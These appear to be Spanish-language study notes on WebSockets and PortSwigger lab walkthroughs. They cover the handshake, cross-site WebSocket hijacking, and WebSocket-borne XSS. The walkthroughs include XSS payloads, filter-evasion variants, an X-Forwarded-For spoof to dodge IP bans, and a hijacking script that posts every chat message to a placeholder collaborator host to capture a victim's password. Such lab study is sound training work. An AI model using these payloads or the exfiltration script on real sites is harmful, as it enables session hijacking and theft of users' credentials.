# Que son los Websockets

WebSockets are a bi-directional, full duplex communications protocol initiated over HTTP. They are commonly used in modern web applications for streaming data and other asynchronous traffic.

## How are WebSocket connections established?

WebSocket connections are normally created using client-side JavaScript like the following:

```
var ws = new WebSocket("wss://normal-website.com/chat");
```

The wss protocol establishes a WebSocket over an encrypted TLS connection, while the ws protocol uses an unencrypted connection.

## Handshake Websockets

To establish the connection, the browser and server perform a WebSocket handshake over HTTP. The browser issues a WebSocket handshake request like the following:

First 

```
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket

```

If the server accepts the connection, it returns a WebSocket handshake response like the following:

```

HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=


```
At this point, the network connection remains open and can be used to send WebSocket messages in either direction

## Explicacion de las cabeceras de Websockets

Several features of the WebSocket handshake messages are worth noting:

1. The Connection and Upgrade headers in the request and response indicate that this is a WebSocket handshake.

2. The Sec-WebSocket-Version request header specifies the WebSocket protocol version that the client wishes to use. This is typically 13.
 
3. The Sec-WebSocket-Key request header contains a Base64-encoded random value, which should be randomly generated in each handshake request.
4. The Sec-WebSocket-Accept response header contains a hash of the value submitted in the Sec-WebSocket-Key request header, concatenated with a specific string defined in the protocol specification. This is done to prevent misleading responses resulting from misconfigured servers or caching proxies.

## Javascript

```
ws.send("Peter Wiener");



```


## Cross-site WebSocket hijacking

The attacker's page can then send arbitrary messages to the server via the connection and read the contents of messages that are received back from the server. This means that, unlike regular CSRF, the attacker gains two-way interaction with the compromised application.

Perform unauthorized actions masquerading as the victim user. As with regular CSRF, the attacker can send arbitrary messages to the server-side application. If the application uses client-generated WebSocket messages to perform any sensitive actions, then the attacker can generate suitable messages cross-domain and trigger those actions.


Retrieve sensitive data that the user can access. Unlike with regular CSRF, cross-site WebSocket hijacking gives the attacker two-way interaction with the vulnerable application over the hijacked WebSocket. If the application uses server-generated WebSocket messages to return any sensitive data to the user, then the attacker can intercept those messages and capture the victim user's data


In terms of the normal conditions for CSRF attacks, you typically need to find a handshake message that relies solely on HTTP cookies for session handling and doesn't employ any tokens or other unpredictable values in request parameters.

For example, the following WebSocket handshake request is probably vulnerable to CSRF, because the only session token is transmitted in a cookie:

```
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```


# Manipulating WebSocket messages to exploit vulnerabilities

Para este lab

1. Primero vamos a Live Chat y podemos ver como viajan los datos porque este funciona con un websocket
2. cuando pulsamos send e interceptamos pues nos deja ver que manda la info asi

```
{"message":"masa&gt;"}

```
3. Si nos fijamos un poco en el codigo al parecer hace url encode de hecho si metemos el caracter <> ya cuando manda la peticion que es interceptada por el burp ya
hizo ese proceso por lo cual esta como sanitizando elw codigo ponemos el payload de XSS y se resuleve.

```
{"message":"<img src=1 onerror='alert(1)'>"}

```

# Lab: Manipulating the WebSocket handshake to exploit vulnerabilities

Primero abrimos la pagina y vemos que usa web sockets si intentamos el ataque del ejercicio pasado nos banea la direccion para 
falsificar nuestra ip se usa:

```
X-Forwarded-For: 1.1.1.1

```
 Antes usaste el intercept y mandaste esa peticion al repeater
 
 Como esta detectando nuestro ataque hay dos metodos
 
 
 ```
 {"message":"<img src=1 oNeRrOr=alert`1`>"}
 {"message":"<iframe src='jAvAsCrIpT:alert'1''>"}
 
 ```



# Lab: Cross-site WebSocket hijacking

Abrimos la pagina y vamos a live chat nos damos cuenta que existe un handshake

```
GET /chat HTTP/1.1
Host: 0a86004303bc44f5c0e901ca00a00005.web-security-academy.net
Connection: Upgrade
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Upgrade: websocket
Origin: https://0a86004303bc44f5c0e901ca00a00005.web-security-academy.net
Sec-WebSocket-Version: 13
Accept-Encoding: gzip, deflate
Accept-Language: es-419,es;q=0.9
Cookie: session=fKUedN2SGDz88MEYg9c3RD6gDqNc77gA
Sec-WebSocket-Key: QutkdXttMx2+F4gNyyxP3Q==

```

```
HTTP/1.1 101 Switching Protocol
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: TjEODRjIn/D2DXqnJawt4Rma+vo=
Content-Length: 0

```

Ahi nos damos cuenta que no protege la session con nada mas que con una cookie por lo tanto si un usuario hace clic en un 
script malicioso que crea una session de ws y controlamos un dominio podriamos interceptar informacion como 
una contraseña o algo asi justo eso se hace


```
<script>
    var ws = new WebSocket('wss://your-websocket-url');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

Entonces lo que se simula es que la victima apreto algo y cayo en este scritp el cual hace una especie de man in the middle 
y recibe los mensajes del usuario en tiempo real y los manda al dominio que controlamos sacamos el pass y listo owned

















































